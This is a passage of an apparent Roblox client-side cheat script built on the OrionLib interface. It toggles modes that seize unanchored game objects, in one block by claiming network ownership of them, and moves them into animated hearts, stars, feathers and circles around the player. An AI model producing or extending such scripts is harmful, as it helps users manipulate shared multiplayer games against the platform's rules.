                task.wait(delayTime)
            end
            SH.PianoConfig.IsPlaying = false
            OrionLib:MakeNotification({ Name = "Complete", Content = "Performance finished", Time = 3 })
        end)
    end
    _G.playSongFromJSONString = playSongFromJSONString

    function stopSong() SH.PianoConfig.IsPlaying = false end
    _G.stopSong = stopSong
end

-- ============================================================================
-- Block 12: Feather Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart
    local attachPhysics = _G.attachPhysics

    function toggleFeather(state)
        SH.FeatherConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.featherToys = findObjects()
            if #SH.featherToys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.FeatherConfig.Enabled = false
                return
            end
            local count = math.min(#SH.featherToys, SH.FeatherConfig.maxSparklers)
            SH.featherRowPoints = {}
            local halfCount = math.floor(count / 2)
            local isOdd = count % 2 == 1
            for i = 1, count do
                local x = isOdd and (i - math.ceil(count / 2)) * SH.FeatherConfig.spacing or (i - halfCount - 0.5) * SH.FeatherConfig.spacing
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                SH.featherRowPoints[i] = { offsetX = x, part = part, assignedToy = nil }
            end
            local distanceGroups = {}
            for i, point in ipairs(SH.featherRowPoints) do
                local absDistance = math.abs(point.offsetX)
                if not distanceGroups[absDistance] then distanceGroups[absDistance] = {} end
                table.insert(distanceGroups[absDistance], i)
            end
            local sortedDistances = {}
            for distance, _ in pairs(distanceGroups) do table.insert(sortedDistances, distance) end
            table.sort(sortedDistances)
            for rank, distance in ipairs(sortedDistances) do
                for _, pointIndex in ipairs(distanceGroups[distance]) do SH.featherRowPoints[pointIndex].distanceRank = rank end
            end
            SH.featherAssignedToys = {}
            for i = 1, math.min(#SH.featherToys, #SH.featherRowPoints) do
                local toy = SH.featherToys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do
                            if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false end
                        end
                        local BG, BP = attachPhysics(primaryPart)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, RowIndex = i, offsetX = SH.featherRowPoints[i].offsetX, distanceRank = SH.featherRowPoints[i].distanceRank }
                        SH.featherRowPoints[i].assignedToy = toyTable
                        table.insert(SH.featherAssignedToys, toyTable)
                    end
                end
            end
            SH.featherTime = 0
            if SH.featherLoopConn then SH.featherLoopConn:Disconnect() end
            SH.featherLoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.FeatherConfig.Enabled or not LocalPlayer.Character then return end
                local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not hrp or not torso then return end
                SH.featherTime = SH.featherTime + dt * SH.FeatherConfig.waveSpeed
                local rightVector = hrp.CFrame.RightVector
                local lookVector = hrp.CFrame.LookVector
                local backVector = -lookVector
                local basePosition = torso.Position + Vector3.new(0, SH.FeatherConfig.heightOffset, 0) + (backVector * SH.FeatherConfig.backwardOffset)
                for _, point in ipairs(SH.featherRowPoints) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local targetPosition = basePosition + (rightVector * toy.offsetX)
                        local amplitude = SH.FeatherConfig.baseAmplitude * toy.distanceRank
                        local finalPosition = targetPosition + Vector3.new(0, math.sin(SH.featherTime) * amplitude, 0)
                        if point.part then point.part.Position = finalPosition end
                        toy.BP.Position = finalPosition
                        local backYRotation = math.atan2(-lookVector.X, -lookVector.Z)
                        local baseCFrame = CFrame.new(finalPosition) * CFrame.Angles(0, backYRotation, 0)
                        toy.BG.CFrame = toy.BG.CFrame:Lerp(baseCFrame * CFrame.Angles(math.rad(-SH.FeatherConfig.tiltAngle), 0, 0), 0.3)
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "Feather Start", Content = "Object count: " .. #SH.featherAssignedToys, Time = 3 })
        else
            if SH.featherLoopConn then SH.featherLoopConn:Disconnect(); SH.featherLoopConn = nil end
            for _, point in ipairs(SH.featherRowPoints) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                end
            end
            SH.featherRowPoints = {}; SH.featherAssignedToys = {}
            OrionLib:MakeNotification({ Name = "Feather Stop", Content = "Feather arrangement cleared", Time = 2 })
        end
    end
    _G.toggleFeather = toggleFeather
end

-- ============================================================================
-- Block 13: Magic Circle Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local getPrimaryPart = _G.getPrimaryPart

    function toggleMagicCircle(state)
        SH.MagicCircleConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            for _, r in ipairs(SH.magicCircleList) do
                if r.part then
                    local bv = r.part:FindFirstChild("MagicCircleBodyVelocity"); if bv then bv:Destroy() end
                    local bg = r.part:FindFirstChild("MagicCircleBodyGyro"); if bg then bg:Destroy() end
                    if r.model then for _, p in ipairs(r.model:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = true; p.CanTouch = true; p.Material = Enum.Material.Plastic; pcall(function() p:SetNetworkOwner(nil) end) end end end
                end
            end
            SH.magicCircleList = {}
            local foundCount = 0
            for _, d in ipairs(workspace:GetDescendants()) do
                if foundCount >= SH.MagicCircleConfig.ObjectCount then break end
                if d:IsA("Model") and d.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local part = getPrimaryPart(d)
                    if part and not part.Anchored then
                        for _, p in ipairs(d:GetDescendants()) do if p:IsA("BasePart") then pcall(function() p:SetNetworkOwner(LocalPlayer) end); p.CanCollide = false; p.CanTouch = false; if SH.MagicCircleConfig.GlowEffect then p.Material = Enum.Material.Neon end end end
                        if not part:FindFirstChild("MagicCircleBodyVelocity") then local bv = Instance.new("BodyVelocity"); bv.Name = "MagicCircleBodyVelocity"; bv.MaxForce = Vector3.new(1e8, 1e8, 1e8); bv.Velocity = Vector3.new(); bv.P = 1e6; bv.Parent = part end
                        if not part:FindFirstChild("MagicCircleBodyGyro") then local bg = Instance.new("BodyGyro"); bg.Name = "MagicCircleBodyGyro"; bg.MaxTorque = Vector3.new(1e8, 1e8, 1e8); bg.CFrame = part.CFrame; bg.P = 1e6; bg.Parent = part end
                        table.insert(SH.magicCircleList, { model = d, part = part })
                        foundCount = foundCount + 1
                    end
                end
            end
            if foundCount == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.MagicCircleConfig.Enabled = false
                return
            end
            SH.magicCircleTAccum = 0
            if SH.magicCircleLoopConn then SH.magicCircleLoopConn:Disconnect() end
            SH.magicCircleLoopConn = RunService.Heartbeat:Connect(function(dt)
                if not SH.MagicCircleConfig.Enabled then return end
                local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not root or #SH.magicCircleList == 0 then return end
                SH.magicCircleTAccum = SH.magicCircleTAccum + dt * (SH.MagicCircleConfig.RotationSpeed / 10)
                local radius = SH.MagicCircleConfig.Diameter / 2
                local angleIncrement = 360 / #SH.magicCircleList
                local rootVelocity = root.AssemblyLinearVelocity or root.Velocity or Vector3.new()
                for i, rec in ipairs(SH.magicCircleList) do
                    local part = rec.part
                    if not part or not part.Parent then continue end
                    local angle = math.rad(i * angleIncrement + SH.magicCircleTAccum * 50)
                    local localPos = Vector3.new(radius * math.cos(angle), SH.MagicCircleConfig.Height, radius * math.sin(angle))
                    if SH.MagicCircleConfig.SymbolType == "Hexagram" then
                        local heightOffset = ((i - 1) % 6 + 1) <= 3 and 0.5 * math.sin(angle * 3) or -0.5 * math.sin(angle * 3)
                        localPos = Vector3.new(radius * math.cos(angle), SH.MagicCircleConfig.Height + heightOffset, radius * math.sin(angle))
                    elseif SH.MagicCircleConfig.SymbolType == "Circle" then
                        localPos = Vector3.new(radius * math.cos(angle), SH.MagicCircleConfig.Height + math.sin(angle * 4) * 0.3, radius * math.sin(angle))
                    end
                    local targetPos = root.Position + localPos
                    local dir = targetPos - part.Position
                    local bv = part:FindFirstChild("MagicCircleBodyVelocity")
                    if bv then bv.Velocity = (dir.Magnitude > 0.1 and dir.Unit * math.min(3000, dir.Magnitude * 50) or Vector3.new()) + rootVelocity end
                    local bg = part:FindFirstChild("MagicCircleBodyGyro")
                    if bg then bg.CFrame = CFrame.lookAt(targetPos, root.Position) * CFrame.Angles(0, math.pi, 0) end
                end
            end)
            OrionLib:MakeNotification({ Name = "Magic Circle Start", Content = "Height: " .. SH.MagicCircleConfig.Height, Time = 3 })
        else
            if SH.magicCircleLoopConn then SH.magicCircleLoopConn:Disconnect(); SH.magicCircleLoopConn = nil end
            for _, rec in ipairs(SH.magicCircleList) do
                if rec.part then
                    local bv = rec.part:FindFirstChild("MagicCircleBodyVelocity"); if bv then bv:Destroy() end
                    local bg = rec.part:FindFirstChild("MagicCircleBodyGyro"); if bg then bg:Destroy() end
                    if rec.model then for _, p in ipairs(rec.model:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = true; p.CanTouch = true; p.Material = Enum.Material.Plastic; pcall(function() p:SetNetworkOwner(nil) end) end end end
                end
            end
            SH.magicCircleList = {}
            OrionLib:MakeNotification({ Name = "Magic Circle Stop", Content = "Magic circle cleared", Time = 2 })
        end
    end
    _G.toggleMagicCircle = toggleMagicCircle
end

-- ============================================================================
-- Block 14: Heart Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart
    local attachPhysics = _G.attachPhysics

    function toggleHeart(state)
        SH.HeartConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.heartToys = findObjects()
            if #SH.heartToys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.HeartConfig.Enabled = false
                return
            end
            local count = math.min(#SH.heartToys, SH.HeartConfig.ObjectCount)
            SH.heartPoints = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                SH.heartPoints[i] = { angle = (i - 1) * (2 * math.pi / count), part = part, assignedToy = nil }
            end
            SH.heartAssignedToys = {}
            for i = 1, math.min(#SH.heartToys, #SH.heartPoints) do
                local toy = SH.heartToys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false end end
                        local BG, BP = attachPhysics(primaryPart)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, baseAngle = SH.heartPoints[i].angle }
                        SH.heartPoints[i].assignedToy = toyTable
                        table.insert(SH.heartAssignedToys, toyTable)
                    end
                end
            end
            SH.heartTime = 0
            if SH.heartLoopConn then SH.heartLoopConn:Disconnect() end
            SH.heartLoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.HeartConfig.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.heartTime = SH.heartTime + dt
                local basePosition = SH.HeartConfig.FollowPlayer and torso.Position or torso.Position
                local pulseEffect = (SH.HeartConfig.PulseSpeed > 0) and math.sin(SH.heartTime * SH.HeartConfig.PulseSpeed) * SH.HeartConfig.PulseAmplitude or 0
                for _, point in ipairs(SH.heartPoints) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local currentAngle = toy.baseAngle + (SH.heartTime * SH.HeartConfig.RotationSpeed)
                        local baseScale = SH.HeartConfig.Size / 20
                        local x = 16 * (math.sin(currentAngle) ^ 3) * baseScale
                        local y = (13 * math.cos(currentAngle) - 5 * math.cos(2*currentAngle) - 2 * math.cos(3*currentAngle) - math.cos(4*currentAngle)) * baseScale
                        if pulseEffect > 0 then local pf = 1 + (pulseEffect * 0.1); x = x * pf; y = y * pf end
                        local targetPosition = basePosition + Vector3.new(x, SH.HeartConfig.Height + math.sin(currentAngle * 2) * 0.5, y)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        toy.BG.CFrame = CFrame.new(targetPosition) * CFrame.Angles(-math.rad(90), 0, 0)
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "Heart Start", Content = "Size: " .. SH.HeartConfig.Size, Time = 3 })
        else
            if SH.heartLoopConn then SH.heartLoopConn:Disconnect(); SH.heartLoopConn = nil end
            for _, point in ipairs(SH.heartPoints) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                end
            end
            SH.heartPoints = {}; SH.heartAssignedToys = {}
            OrionLib:MakeNotification({ Name = "Heart Stop", Content = "Heart arrangement cleared", Time = 2 })
        end
    end
    _G.toggleHeart = toggleHeart
end

-- ============================================================================
-- Block 15: Big Heart Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart
    local attachPhysics = _G.attachPhysics

    function toggleBigHeart(state)
        SH.BigHeartConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.bigHeartToys = findObjects()
            if #SH.bigHeartToys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.BigHeartConfig.Enabled = false
                return
            end
            local count = math.min(#SH.bigHeartToys, SH.BigHeartConfig.ObjectCount)
            SH.bigHeartPoints = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                SH.bigHeartPoints[i] = { angle = (i - 1) * (2 * math.pi / count), part = part, assignedToy = nil }
            end
            SH.bigHeartAssignedToys = {}
            for i = 1, math.min(#SH.bigHeartToys, #SH.bigHeartPoints) do
                local toy = SH.bigHeartToys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false end end
                        local BG, BP = attachPhysics(primaryPart)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, baseAngle = SH.bigHeartPoints[i].angle }
                        SH.bigHeartPoints[i].assignedToy = toyTable
                        table.insert(SH.bigHeartAssignedToys, toyTable)
                    end
                end
            end
            SH.bigHeartTime = 0
            if SH.bigHeartLoopConn then SH.bigHeartLoopConn:Disconnect() end
            SH.bigHeartLoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.BigHeartConfig.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.bigHeartTime = SH.bigHeartTime + dt
                local basePosition = SH.BigHeartConfig.FollowPlayer and torso.Position or torso.Position
                local pulseEffect = (SH.BigHeartConfig.PulseSpeed > 0) and math.sin(SH.bigHeartTime * SH.BigHeartConfig.PulseSpeed) * SH.BigHeartConfig.PulseAmplitude or 0
                for _, point in ipairs(SH.bigHeartPoints) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local currentAngle = toy.baseAngle + (SH.bigHeartTime * SH.BigHeartConfig.RotationSpeed)
                        local baseScale = SH.BigHeartConfig.Size / 20
                        local x = 16 * (math.sin(currentAngle) ^ 3) * baseScale * SH.BigHeartConfig.HeartScale
                        local y = (13 * math.cos(currentAngle) - 5 * math.cos(2*currentAngle) - 2 * math.cos(3*currentAngle) - math.cos(4*currentAngle)) * baseScale * SH.BigHeartConfig.HeartScale * SH.BigHeartConfig.VerticalStretch
                        if pulseEffect > 0 then local pf = 1 + (pulseEffect * 0.1); x = x * pf; y = y * pf end
                        local targetPosition = basePosition + Vector3.new(x, SH.BigHeartConfig.Height + math.sin(currentAngle * 2) * 1.0, y)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        toy.BG.CFrame = CFrame.new(targetPosition) * CFrame.Angles(-math.rad(90), 0, 0)
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "Big Heart Start", Content = "Size: " .. SH.BigHeartConfig.Size, Time = 3 })
        else
            if SH.bigHeartLoopConn then SH.bigHeartLoopConn:Disconnect(); SH.bigHeartLoopConn = nil end
            for _, point in ipairs(SH.bigHeartPoints) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                end
            end
            SH.bigHeartPoints = {}; SH.bigHeartAssignedToys = {}
            OrionLib:MakeNotification({ Name = "Big Heart Stop", Content = "Big heart arrangement cleared", Time = 2 })
        end
    end
    _G.toggleBigHeart = toggleBigHeart
end

-- ============================================================================
-- Block 16: Star of David Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart
    local attachPhysics = _G.attachPhysics

    function toggleStarOfDavid(state)
        SH.StarOfDavidConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.starOfDavidToys = findObjects()
            if #SH.starOfDavidToys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.StarOfDavidConfig.Enabled = false
                return
            end
            local count = math.min(#SH.starOfDavidToys, SH.StarOfDavidConfig.ObjectCount)
            SH.starOfDavidPoints = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                SH.starOfDavidPoints[i] = { angle = (i - 1) * (2 * math.pi / 6), part = part, assignedToy = nil, triangleIndex = math.floor((i - 1) / 2) + 1 }
            end
            SH.starOfDavidAssignedToys = {}
            for i = 1, math.min(#SH.starOfDavidToys, #SH.starOfDavidPoints) do
                local toy = SH.starOfDavidToys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false end end
                        local BG, BP = attachPhysics(primaryPart)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, baseAngle = SH.starOfDavidPoints[i].angle }
                        SH.starOfDavidPoints[i].assignedToy = toyTable
                        table.insert(SH.starOfDavidAssignedToys, toyTable)
                    end
                end
            end
            SH.starOfDavidTime = 0
            if SH.starOfDavidLoopConn then SH.starOfDavidLoopConn:Disconnect() end
            SH.starOfDavidLoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.StarOfDavidConfig.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.starOfDavidTime = SH.starOfDavidTime + dt
                local basePosition = SH.StarOfDavidConfig.FollowPlayer and torso.Position or torso.Position
                for i, point in ipairs(SH.starOfDavidPoints) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local currentAngle = toy.baseAngle + (SH.starOfDavidTime * SH.StarOfDavidConfig.RotationSpeed)
                        local scale = SH.StarOfDavidConfig.Size / 10
                        local x = math.cos(currentAngle) * scale
                        local z = math.sin(currentAngle) * scale
                        local heightOffset = (i % 2 == 0) and SH.StarOfDavidConfig.TriangleHeight or -SH.StarOfDavidConfig.TriangleHeight
                        local targetPosition = basePosition + Vector3.new(x, SH.StarOfDavidConfig.Height + heightOffset + math.sin(SH.starOfDavidTime * SH.StarOfDavidConfig.PulseSpeed) * 0.1, z)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        local direction = (targetPosition - basePosition).Unit
                        if direction.Magnitude > 0 then toy.BG.CFrame = CFrame.lookAt(targetPosition, targetPosition + direction) end
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "Star of David Start", Content = "Size: " .. SH.StarOfDavidConfig.Size, Time = 3 })
        else
            if SH.starOfDavidLoopConn then SH.starOfDavidLoopConn:Disconnect(); SH.starOfDavidLoopConn = nil end
            for _, point in ipairs(SH.starOfDavidPoints) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                end
            end
            SH.starOfDavidPoints = {}; SH.starOfDavidAssignedToys = {}
            OrionLib:MakeNotification({ Name = "Star of David Stop", Content = "Star of David arrangement cleared", Time = 2 })
        end
    end
    _G.toggleStarOfDavid = toggleStarOfDavid
end

-- ============================================================================
-- Block 17: Star Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart
    local attachPhysics = _G.attachPhysics

    function toggleStar(state)
        SH.StarConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            SH.starToys = findObjects()
            if #SH.starToys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.StarConfig.Enabled = false
                return
            end
            local count = math.min(#SH.starToys, SH.StarConfig.ObjectCount)
            SH.starPoints = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
